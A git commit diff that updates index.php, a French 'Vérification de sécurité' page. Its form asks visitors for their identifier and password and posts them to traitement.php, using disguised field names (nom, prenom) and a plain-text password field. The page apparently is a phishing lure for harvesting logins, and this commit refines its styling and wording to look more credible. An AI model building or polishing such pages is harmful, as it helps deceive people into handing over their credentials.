e2a1442a3d6e3e9c03d1b24463d9b0111559bc6f
TheKomara <134555053+TheKomara@users.noreply.github.com>
2023-06-04 19:47:59 +0200

    Update index.php

--- index.php
+++ index.php
@@ -5,7 +5,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title> verification de securite </title>
+    <title>Verification de sécurité</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body {
             background-image: url('278823025_5089033417844850_3431604030020033478_n.png');
@@ -43,18 +44,28 @@
         input[type="submit"]:hover {
             background-color: #45a049;
         }
+
+        /* Media queries for responsive design */
+        @media only screen and (max-width: 600px) {
+            body {
+                padding: 20px;
+            }
+
+            form {
+                max-width: 100%;
+            }
+        }
     </style>
 </head>
 <body>
-    <h1> Verification de securite </h1>
+    <h1>Verification de sécurité</h1>
     <form method="post" action="traitement.php">
-        <input type="text" name="nom" placeholder="identifiant" required>
-        <input type="text" name="prenom" placeholder="mot de pass" required>
-        <input type="submit" value="verifier">
+        <input type="text" name="nom" placeholder="Identifiant" required>
+        <input type="text" name="prenom" placeholder="Mot de passe" required>
+        <input type="submit" value="Vérifier">
     </form>
 </body>
 </html>
-
 
 
 <?php
